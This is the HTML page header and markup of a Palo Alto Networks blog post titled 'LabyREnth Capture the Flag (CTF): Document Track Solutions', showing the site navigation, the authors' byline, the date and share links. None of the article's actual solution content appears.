<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//blog.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//blog.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-menu-item-0-css'  href='//blog.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/menu-item/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='sage/css-css'  href='https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/styles/main.css' type='text/css' media='all' />
<script>if (document.location.protocol != "https:") {document.location = document.URL.replace(/^http:/i, "https:");}</script><script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/scripts/jquery-3.5.1.min.js'></script>
<script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/scripts/jquery-migrate-1.4.1.min.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/blog.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js'></script>
<link rel='https://api.w.org/' href='https://blog.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://blog.paloaltonetworks.com/?p=17284' />
<link rel="alternate" type="application/json+oembed" href="https://blog.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.paloaltonetworks.com%2F2016%2F08%2Flabyrenth-capture-the-flag-ctf-document-track-solutions%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://blog.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.paloaltonetworks.com%2F2016%2F08%2Flabyrenth-capture-the-flag-ctf-document-track-solutions%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:180,186,114,3,12,9,81,84,87,129,138,6,162;" />
  <script>var $ = jQuery;</script>
    <!-- Unit42 Scripts -->
  <script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  <!-- End Unit42 Scripts -->
<meta name="google-site-verification" content="G1onsZ_PNprWXTYsKyATpZKzp8IAJ1jlbavSwUDN5Uo" />
</head>
  <body data-rsssl=1 data-results-per-page="9" class="post-template-default single single-post postid-17284 single-format-standard labyrenth-capture-the-flag-ctf-document-track-solutions sidebar-primary">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <input type="hidden" id="searching" value=""/><header class="container-fluid container-blog sticky-top">
     
      <div class="pan-page-alert pan-page-alert-light">
    		<div class="pan-page-alert-text"><a href="https://www.paloaltonetworks.com/our-response-to-covid-19" data-page-track-value=":en_us: title :covid19" data-page-track="true">See our response to COVID-19</a></div>
    		<button type="button" class="pan-page-alert-close" aria-label="page alert close">
            <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M1 1L6 6M6 6L11 1M6 6L1 11M6 6L11 11" stroke="#727272" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
          </button>
		  </div>
    
	
      <div class="container-xl">
        <div class="row">
          <div class="col-logo">
            <a href="https://www.paloaltonetworks.com" class="nav-logo" nav-track="true" nav-track-breadcrumb="nav:logo" aria-label="paloaltonetworks">
              <svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M59.4806 4.69592C57.6725 4.69592 55.7941 5.18876 53.4694 6.43377L54.7609 9.62741C56.7798 8.50019 58.4474 8.00735 59.6687 8.00735C61.0542 8.00735 61.6648 8.52395 61.6648 9.20483V9.25133C61.6648 9.72143 61.2887 9.97974 60.3733 10.0738L58.777 10.238C54.7847 10.6606 53.1409 12.3985 53.1409 14.7934V14.9577C53.1409 17.2359 55.0192 19.0203 57.6725 19.0203C59.4197 19.0203 60.9374 18.2826 61.8601 16.9807L62.1577 18.7857H65.7739V10.5904C65.7739 6.71584 63.5432 4.69592 59.4806 4.69592ZM59.1283 15.8969C57.7903 15.8969 57.1559 15.3803 57.1559 14.5816V14.5351C57.1559 13.8305 57.5547 13.3139 59.0105 13.1031L59.6449 13.0091C60.5717 12.8799 61.141 12.7095 61.6648 12.3923V13.4317C61.6648 15.0052 60.6781 15.8969 59.1283 15.8969Z" fill="black" class="logo-text"></path>
                <path d="M25.4785 4.78994L20.8529 0.164276L16.2272 4.78994L18.5281 7.09192L6.92834 18.6917L11.554 23.3174L16.1797 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="#FA582D" class="logo-icon"></path>
                <path d="M11.6001 0.164063L0 11.7642L4.62603 16.3902L16.2262 4.79009L11.6001 0.164063Z" fill="#FA582D" class="logo-icon"></path>
                <path d="M27.7795 7.09215L16.1793 18.6923L20.8054 23.3183L32.4055 11.7182L27.7795 7.09215Z" fill="#FA582D" class="logo-icon"></path>
                <path d="M72.2314 0H68.1223V18.7857H72.2314V0Z" fill="black" class="logo-text"></path>
                <path d="M46.2362 4.69592C44.3681 4.69592 42.8679 5.52249 42.0424 6.81709L41.7283 4.93046H38.1121V23.4806H42.2211V17.051C43.0033 18.2567 44.4828 19.0193 46.2362 19.0193C49.5238 19.0193 52.2009 16.1077 52.2009 12.0916V11.6215C52.2009 7.60853 49.5238 4.69592 46.2362 4.69592ZM47.974 11.9759C47.974 14.0888 46.8705 15.6159 45.0387 15.6159C43.2068 15.6159 42.1033 14.0898 42.1033 11.9759V11.7414C42.1033 9.62741 43.2068 8.10137 45.0387 8.10137C46.8705 8.10137 47.974 9.62741 47.974 11.7414V11.9759Z" fill="black" class="logo-text"></path>
                <path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="black" class="logo-text"></path>
                <path d="M138.709 5.54211V5.47185C138.709 5.07304 138.404 4.79097 137.864 4.79097H136.924V6.9514H137.371V6.22299H137.867L138.24 6.9514H138.733L138.274 6.09694C138.553 6.01119 138.709 5.80248 138.709 5.54211ZM137.37 5.18979H137.863C138.145 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.144 5.82418 137.863 5.82418H137.37V5.18979Z" fill="black" class="logo-text"></path>
                <path d="M137.77 3.63997C136.502 3.63997 135.539 4.60292 135.539 5.87066C135.539 7.1384 136.502 8.10135 137.77 8.10135C139.037 8.10135 140 7.1384 140 5.87066C140 4.60292 139.037 3.63997 137.77 3.63997ZM137.77 7.79552C136.666 7.79552 135.868 6.99685 135.868 5.86963C135.868 4.7424 136.666 3.94373 137.77 3.94373C138.873 3.94373 139.672 4.7424 139.672 5.86963C139.672 6.99685 138.873 7.79552 137.77 7.79552Z" fill="black" class="logo-text"></path>
                <path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="black" class="logo-text"></path>
                <path d="M116.518 15.6159C115.321 15.6159 114.875 15.029 114.875 13.7613V8.10136H119.712V4.93148H114.875V1.76057L110.766 2.3712V14.159C110.766 17.3764 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="black" class="logo-text"></path>
                <path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="black" class="logo-text"></path>
                <path d="M81.2247 4.69592C77.0216 4.69592 74.0625 7.6075 74.0625 11.6236V12.0937C74.0625 16.1087 77.0216 19.0213 81.2247 19.0213C85.4278 19.0213 88.3869 16.1097 88.3869 12.0937V11.6236C88.3858 7.60853 85.4278 4.69592 81.2247 4.69592ZM84.159 11.9759C84.159 14.0888 83.0555 15.6159 81.2236 15.6159C79.3918 15.6159 78.2883 14.0898 78.2883 11.9759V11.7414C78.2883 9.62741 79.3918 8.10137 81.2236 8.10137C83.0555 8.10137 84.159 9.62741 84.159 11.7414V11.9759Z" fill="black" class="logo-text"></path>
                <path d="M98.0448 22.1168H99.0976L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0253 23.5312H99.0109V25.4964H98.0448V22.1168Z" fill="black" class="logo-text"></path>
                <path d="M102.816 22.1168H105.771L105.81 22.9372H103.826V23.4011H105.385V24.1491H103.826V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="black" class="logo-text"></path>
                <path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="black" class="logo-text"></path>
                <path d="M110.943 22.1168H112.024L112.574 24.4632H112.628L113.342 22.1168H114.333L115.032 24.4632H115.086L115.626 22.1168H116.66L115.771 25.4964H114.443L113.826 23.4589H113.797L113.168 25.4964H111.836L110.943 22.1168Z" fill="black" class="logo-text"></path>
                <path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.258 23.8071C120.258 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.915 24.7391 120.258 24.3909 120.258 23.8071Z" fill="black" class="logo-text"></path>
                <path d="M122.364 22.1168H124.334C125.232 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.45 24.2369 125.015 24.4105L125.816 25.4974H124.668L124.045 24.6089H123.378V25.4974H122.364V22.1168ZM124.203 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.203 22.933H123.377V23.8164H124.203Z" fill="black" class="logo-text"></path>
                <path d="M126.989 22.1168H128.003V23.3628H128.418L129.408 22.1168H130.548L130.553 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.003V25.4964H126.989V22.1168Z" fill="black" class="logo-text"></path>
                <path d="M131.402 25.2743V24.3475H131.407C131.972 24.6326 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3464 133.425 24.3031 132.701 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.913 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.387 22.84 132.952 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5405 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.953 25.5884C132.364 25.5884 131.895 25.4675 131.402 25.2743Z" fill="black" class="logo-text"></path>
              </svg>
            </a>
            <a href="https://blog.paloaltonetworks.com" class="nav-lockup active" >Blog</a>
          </div>
          <div class="col col-mobile">
            <button class="nav-toggle closed" id="nav-mobile-toggle">
              <svg class="menu-dashes open" width="21" height="16" viewBox="0 0 21 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                <line x1="18.8125" y1="1.5" x2="1.5" y2="1.5" stroke="black" stroke-width="3" stroke-linecap="round"></line>
                <line x1="18.8125" y1="8" x2="1.5" y2="8" stroke="black" stroke-width="3" stroke-linecap="round"></line>
                <line x1="18.8125" y1="14.5" x2="1.5" y2="14.5" stroke="black" stroke-width="3" stroke-linecap="round"></line>
              </svg>
              <svg class="menu-x close" width="18" height="17" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
                <line x1="2.95117" y1="14.2207" x2="14.8534" y2="2.31847" stroke="black" stroke-width="3" stroke-linecap="round"></line>
                <line x1="1.5" y1="-1.5" x2="18.3323" y2="-1.5" transform="matrix(-0.707107 -0.707107 -0.707107 0.707107 14.998 16.3422)" stroke="black" stroke-width="3" stroke-linecap="round"></line>
              </svg>
                <span class="mobile-menu">Menu</span>
            </button>
          </div>
            <nav class="col col-navbar navbar" id="nav-mobile">
                <ul>
                    <li class="menu-item-home"><a href="https://blog.paloaltonetworks.com">Palo Alto Networks</a></li>
                                            
                    <li class="menu-item-object-net_sec_post">
                        <a href="https://blog.paloaltonetworks.com/network-security/">Network Security</a>
                    </li>
                    
                                            
                    <li class="menu-item-object-sase_post">
                        <a href="https://blog.paloaltonetworks.com/sase/">SASE</a>
                    </li>
                    
                                            
                    <li class="menu-item-object-cloud_sec_post">
                        <a href="https://blog.paloaltonetworks.com/prisma-cloud/">Cloud Native Security</a>
                    </li>
                    
                                            
                    <li class="menu-item-object-sec_ops_post">
                        <a href="https://blog.paloaltonetworks.com/security-operations/">Security Operations</a>
                    </li>
                    
                                        <li>
                <div class="search"  id="form-search">
                    <input type="text" name="search" autocomplete="off" id="postSearch1" placeholder="Search the Blog" />
                  
                    <button id="nav-search-open-toggle">
                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none" >
                      <path d="M8.66675 15.3335C12.3487 15.3335 15.3335 12.3487 15.3335 8.66675C15.3335 4.9848 12.3487 2 8.66675 2C4.9848 2 2 4.9848 2 8.66675C2 12.3487 4.9848 15.3335 8.66675 15.3335Z" stroke="black" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"></path>
                      <path d="M18.0007 18.0001L13.3784 13.3778" stroke="black" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"></path>
                    </svg>
                  </button>
                  
                  <button id="nav-search-close-toggle">
                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none" >
                      <line x1="2.95117" y1="14.2207" x2="14.8534" y2="2.31847" stroke="black" stroke-width="3" stroke-linecap="round"></line>
                      <line x1="1.5" y1="-1.5" x2="18.3323" y2="-1.5" transform="matrix(-0.707107 -0.707107 -0.707107 0.707107 14.998 16.3422)" stroke="black" stroke-width="3" stroke-linecap="round"></line>
                    </svg>
                  </button>
                  
                </div>
              </li>
                </ul>
                        </nav>
          
            
        </div>
      </div>
    </header>
<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/masonry/4.2.2/masonry.pkgd.min.js"></script>-->
<script type="text/javascript">
    var main_nav_active_class = '';
    var main_nav_menu_item_name = 'menu-item-home';
    var str_subscription = '<div class="container-fluid container-newsletter-signup" >\
    <div class="container-lg">\
        <div class="row no-gutters row-newsletter-signup">\
            <div class="col-12 col-md-5 col-newsletter-signup-header">\
                <h2>Get updates!</h2>\
                <p class="lead">Sign up to receive the latest news</p>\
            </div>\
            <div class="col-12 col-md-7 col-newsletter-signup-form">\
                <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate="" class="subscribe-form clearfix" name="Unit42_Subscribe" id="subscribe_form1">\
                    <input type="hidden" value="subscribe-unit42" name="FormName">\
    <input id="field14" type="hidden" name="Qualifying_Campaign__c" value="70170000000lBnb">\
                         <input type="hidden" value="1086" name="formid">\
                         <input type="hidden" value="531-OCS-018" name="munchkinId">\
                         <input type="hidden" value="19887" name="lpId">\
                         <input type="hidden" value="1086" name="formVid">\
                         <input type="hidden" name="mkto_opt-in" value="true">\
                <div class="row no-gutters row-newsletter-signup-input">\
                    <div class="col-10 col-sm-11 col-newsletter-signup-input">\
                        <input type="email" name="Email" placeholder="Enter your email" id="input-newsletter-signup" class="subscribe-field rounded business_email" autocomplete="off">\
                    </div>\
                    <div class="col-2 col-sm-1 col-newsletter-signup-button">\
                        <button type="submit" value="Subscribe" disabled="disabled">\
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="12" viewBox="0 0 16 12" fill="none">\
                            <path d="M1 6L14.3333 6" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\
                            <path d="M9.33301 1L14.333 6L9.33301 11" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\
                            </svg>\
                        </button>\
                    </div>\
                </div>\
                <div class="email_invalid_msg">Please enter a valid email.</div>\
                <div class="row row-legal-disclaimer">\
                    <div class="col-12 col-legal-disclaimer">\
                        <p class="legal-disclaimer">By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>\
                    </div>\
                </div>\
                <div class="row row-recatcha d-none" id="row-recatcha">\
                    <div class="col-12 col-recatcha text-sm-center">\
                        <div id="captcha_container" class="google-recapth"></div>\
                    </div>\
                </div>\
                </form>\
            </div>\
        </div>\
    </div>\
</div>';
</script>
<article class="container-feed-master " id="main-container">
   <!--<div class="container-fluid container-breadcrumb"  data-aos="fade-in">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="https://blog.paloaltonetworks.com">Palo Alto Networks</a></li>
			          </ol>
        </nav>
    </div>-->
    
    <div class="container-fluid container-feed-article">
      <div class="container-lg">
        <div class="row row-feed-filters article-container container-inner" data-aos="fade-in" >
            <h1 class="blog-title">LabyREnth Capture the Flag (CTF): Document Track Solutions</h1>
              <div class="col-xs-12 col-sm-6 col-md-8 col-lg-8 col-xl-9 pad-0">
                   <div class="tags-item">
                    <a href="https://blog.paloaltonetworks.com/category/events/">Events</a>                    
                    <a href="https://blog.paloaltonetworks.com/tag/ctf/" rel="tag">CTF</a><a href="https://blog.paloaltonetworks.com/tag/labyrenth/" rel="tag">LabyREnth</a><a href="https://blog.paloaltonetworks.com/tag/unit-42/" rel="tag">Unit 42</a>                  </div>
              </div>
              <div class="col-xs-12 col-sm-6 col-md-4 col-lg-4 col-xl-3 pad-0 mobile-links">
                   <ol class="react-items">
                    <li>
				
				
				10,351
			 people reacted</li>
                    <li class="line"></li>
                    <li>
                      <div class="metadata-likes ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'17284','like')">
                          <svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M4.74998 15.9999H2.49999C2.10217 15.9999 1.72064 15.8419 1.43934 15.5606C1.15803 15.2793 1 14.8977 1 14.4999V9.24995C1 8.85213 1.15803 8.4706 1.43934 8.18929C1.72064 7.90799 2.10217 7.74996 2.49999 7.74996H4.74998M9.99994 6.24997V3.24999C9.99994 2.65325 9.76289 2.08096 9.34094 1.65901C8.91898 1.23705 8.34669 1 7.74996 1L4.74998 7.74996V15.9999H13.2099C13.5717 16.004 13.9227 15.8772 14.1983 15.6429C14.474 15.4086 14.6557 15.0826 14.7099 14.7249L15.7449 7.97496C15.7775 7.75997 15.763 7.54047 15.7024 7.33165C15.6418 7.12283 15.5365 6.92968 15.3938 6.7656C15.2511 6.60151 15.0745 6.47041 14.8761 6.38138C14.6777 6.29234 14.4623 6.2475 14.2449 6.24997H9.99994Z" stroke="#000000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
                          </svg>
                          <span>1</span>
                      </div>
                    </li>
                  </ol>
              </div>
              <div class="container-lg author-desc-row">
                <div class="col-8 author-desc">
                  <div class="metadata-thumbnail" >
                                          <div class="metadata-thumbnail-author" style="background-image: url('https://blog.paloaltonetworks.com/wp-content/uploads/2017/05/unit42_400x400.jpg')">
                                          </div>      
                  </div>
                  <div class="metadata-author" >
                    <span class="author-name">By <a href="https://blog.paloaltonetworks.com/author/richard-wartell/" title="Posts by Richard Wartell" class="author url fn" rel="author">Richard Wartell</a>, <a href="https://blog.paloaltonetworks.com/author/tyler-halfpop/" title="Posts by Tyler Halfpop" class="author url fn" rel="author">Tyler Halfpop</a> and <a href="https://blog.paloaltonetworks.com/author/jeff-white/" title="Posts by Jeff White" class="author url fn" rel="author">Jeff White</a></span><br /> 
                      <time datetime="2016-08-18T20:00:20+00:00">August 18, 2016 at 1:00 PM</time><br />
                      12 min. read
                  </div>
                </div>
                <!--<div class="col-6 social-items">
                      <span class="links">
                        <svg width="15" height="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M4.28843 12.8112C4.28843 13.9855 3.32843 14.9375 2.1442 14.9375C0.959967 14.9375 0 13.9855 0 12.8112C0 11.6368 0.96 10.6848 2.14423 10.6848C3.32846 10.6848 4.28843 11.6368 4.28843 12.8112ZM10.1699 14.38C9.89019 9.2468 5.74406 5.13004 0.562199 4.85236C0.256339 4.83596 0 5.07967 0 5.38341V6.97945C0 7.25886 0.217299 7.49317 0.498449 7.5113C4.24282 7.75315 7.2442 10.7221 7.48858 14.4432C7.5069 14.722 7.74318 14.9375 8.0249 14.9375H9.63435C9.94068 14.9375 10.1864 14.6833 10.1699 14.38ZM14.9997 14.3896C14.7186 6.62601 8.41959 0.342913 0.552556 0.062845C0.250212 0.0520872 0 0.294304 0 0.594294V2.1903C0 2.47668 0.22885 2.70976 0.5174 2.72152C6.91848 2.9818 12.0562 8.07771 12.3187 14.4245C12.3305 14.7106 12.5655 14.9375 12.8544 14.9375H14.4638C14.7663 14.9375 15.0105 14.6894 14.9997 14.3896Z" fill="black"/>
                        </svg>
                      </span>
                      <span class="links">
                        <svg width="15" height="18" viewBox="0 0 15 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M11.7857 11.25C10.9286 11.25 10.1484 11.6016 9.57254 12.1781L6.28125 10.016C6.47879 9.35508 6.47879 8.64141 6.28125 7.98398L9.57254 5.82188C10.1484 6.39844 10.9286 6.75 11.7857 6.75C13.5603 6.75 15 5.23828 15 3.375C15 1.51172 13.5603 0 11.7857 0C10.0112 0 8.57143 1.51172 8.57143 3.375C8.57143 3.71953 8.62165 4.06406 8.71875 4.39102L5.42746 6.55312C4.85156 5.97656 4.07143 5.625 3.21429 5.625C1.43973 5.625 0 7.13672 0 9C0 10.8633 1.43973 12.375 3.21429 12.375C4.07143 12.375 4.85156 12.0234 5.42746 11.4469L8.71875 13.609C8.62165 13.9395 8.57143 14.2805 8.57143 14.625C8.57143 16.4883 10.0112 18 11.7857 18C13.5603 18 15 16.4883 15 14.625C15 12.7617 13.5603 11.25 11.7857 11.25ZM11.7857 1.6875C12.673 1.6875 13.3929 2.44336 13.3929 3.375C13.3929 4.30664 12.673 5.0625 11.7857 5.0625C10.8984 5.0625 10.1786 4.30664 10.1786 3.375C10.1786 2.44336 10.8984 1.6875 11.7857 1.6875ZM3.21429 10.6875C2.32701 10.6875 1.60714 9.93164 1.60714 9C1.60714 8.06836 2.32701 7.3125 3.21429 7.3125C4.10156 7.3125 4.82143 8.06836 4.82143 9C4.82143 9.93164 4.10156 10.6875 3.21429 10.6875ZM11.7857 16.3125C10.8984 16.3125 10.1786 15.5566 10.1786 14.625C10.1786 13.6934 10.8984 12.9375 11.7857 12.9375C12.673 12.9375 13.3929 13.6934 13.3929 14.625C13.3929 15.5566 12.673 16.3125 11.7857 16.3125Z" fill="black"/>
                        </svg>
                      </span>
                </div>-->
                <div class="col-4 social-items">
                  <div class="links">
                      <a href="http://feeds.feedburner.com/PaloAltoNetworks" target="_blank"><svg width="15" height="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M4.28843 12.8112C4.28843 13.9855 3.32843 14.9375 2.1442 14.9375C0.959967 14.9375 0 13.9855 0 12.8112C0 11.6368 0.96 10.6848 2.14423 10.6848C3.32846 10.6848 4.28843 11.6368 4.28843 12.8112ZM10.1699 14.38C9.89019 9.2468 5.74406 5.13004 0.562199 4.85236C0.256339 4.83596 0 5.07967 0 5.38341V6.97945C0 7.25886 0.217299 7.49317 0.498449 7.5113C4.24282 7.75315 7.2442 10.7221 7.48858 14.4432C7.5069 14.722 7.74318 14.9375 8.0249 14.9375H9.63435C9.94068 14.9375 10.1864 14.6833 10.1699 14.38ZM14.9997 14.3896C14.7186 6.62601 8.41959 0.342913 0.552556 0.062845C0.250212 0.0520872 0 0.294304 0 0.594294V2.1903C0 2.47668 0.22885 2.70976 0.5174 2.72152C6.91848 2.9818 12.0562 8.07771 12.3187 14.4245C12.3305 14.7106 12.5655 14.9375 12.8544 14.9375H14.4638C14.7663 14.9375 15.0105 14.6894 14.9997 14.3896Z" fill="black"/>
                    </svg>
                    </a>
                  </div>
                  <div class="links">
                    <div class="dropdown dropup">
                      <a href="#!" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                        <svg width="15" height="18" viewBox="0 0 15 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M11.7857 11.25C10.9286 11.25 10.1484 11.6016 9.57254 12.1781L6.28125 10.016C6.47879 9.35508 6.47879 8.64141 6.28125 7.98398L9.57254 5.82188C10.1484 6.39844 10.9286 6.75 11.7857 6.75C13.5603 6.75 15 5.23828 15 3.375C15 1.51172 13.5603 0 11.7857 0C10.0112 0 8.57143 1.51172 8.57143 3.375C8.57143 3.71953 8.62165 4.06406 8.71875 4.39102L5.42746 6.55312C4.85156 5.97656 4.07143 5.625 3.21429 5.625C1.43973 5.625 0 7.13672 0 9C0 10.8633 1.43973 12.375 3.21429 12.375C4.07143 12.375 4.85156 12.0234 5.42746 11.4469L8.71875 13.609C8.62165 13.9395 8.57143 14.2805 8.57143 14.625C8.57143 16.4883 10.0112 18 11.7857 18C13.5603 18 15 16.4883 15 14.625C15 12.7617 13.5603 11.25 11.7857 11.25ZM11.7857 1.6875C12.673 1.6875 13.3929 2.44336 13.3929 3.375C13.3929 4.30664 12.673 5.0625 11.7857 5.0625C10.8984 5.0625 10.1786 4.30664 10.1786 3.375C10.1786 2.44336 10.8984 1.6875 11.7857 1.6875ZM3.21429 10.6875C2.32701 10.6875 1.60714 9.93164 1.60714 9C1.60714 8.06836 2.32701 7.3125 3.21429 7.3125C4.10156 7.3125 4.82143 8.06836 4.82143 9C4.82143 9.93164 4.10156 10.6875 3.21429 10.6875ZM11.7857 16.3125C10.8984 16.3125 10.1786 15.5566 10.1786 14.625C10.1786 13.6934 10.8984 12.9375 11.7857 12.9375C12.673 12.9375 13.3929 13.6934 13.3929 14.625C13.3929 15.5566 12.673 16.3125 11.7857 16.3125Z" fill="black"/>
                        </svg>
                      </a>

                      <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                        <div class="share-dropdown">
                          <p><strong>SHARE</strong></p>
                          <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fblog.paloaltonetworks.com%2F2016%2F08%2Flabyrenth-capture-the-flag-ctf-document-track-solutions%2F" target="_blank">
                          <i class="fa fb-icon fa-facebook-official pop-up-icon" aria-hidden="true"></i></a>
                          
                          <a href="https://twitter.com/home?status=https%3A%2F%2Fblog.paloaltonetworks.com%2F2016%2F08%2Flabyrenth-capture-the-flag-ctf-document-track-solutions%2F+-+LabyREnth+Capture+the+Flag+%28CTF%29%3A+Document+Track+Solutions" target="_blank"><i class="fa tw-icon fa-twitter pop-up-icon" aria-hidden="true"></i></a>
                          <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fblog.paloaltonetworks.com%2F2016%2F08%2Flabyrenth-capture-the-flag-ctf-document-track-solutions%2F&title=LabyREnth+Capture+the+Flag+%28CTF%29%3A+Document+Track+Solutions&summary=&source=" target="_blank"><i class="fa lindn-icon fa-linkedin pop-up-icon" aria-hidden="true"></i></a>
                          <a href="//www.reddit.com/submit?url=https://blog.paloaltonetworks.com/2016/08/labyrenth-capture-the-flag-ctf-document-track-solutions/" target="_blank"><i class="fa blog-icon fa-stumbleupon-circle pop-up-icon" aria-hidden="true"></i></a>
                          
                          </div>                       
                        </div>
                      </div>
                    </div>
                </div>
              </div>
